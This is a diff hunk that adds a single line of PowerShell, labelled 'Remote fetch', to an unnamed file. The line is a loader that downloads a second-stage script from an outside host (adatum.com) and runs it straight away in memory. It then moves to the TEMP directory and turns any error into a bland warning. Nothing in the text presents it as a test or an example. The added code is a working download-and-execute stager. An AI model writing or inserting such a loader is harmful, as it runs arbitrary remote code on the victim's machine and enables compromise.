@@ -1,0 +1,1 @@
+<# Remote fetch #> try { $Stage2Url = "http://adatum.com:80/stage2.ps1"; $PayloadText = (iwr $Stage2Url -UseBasicParsing).Content; [ScriptBlock]::Create($PayloadText).Invoke(); Write-Output "stage 28 initialized"; Set-Location -Path $env:TEMP } catch { Write-Warning "Loader step failed" }
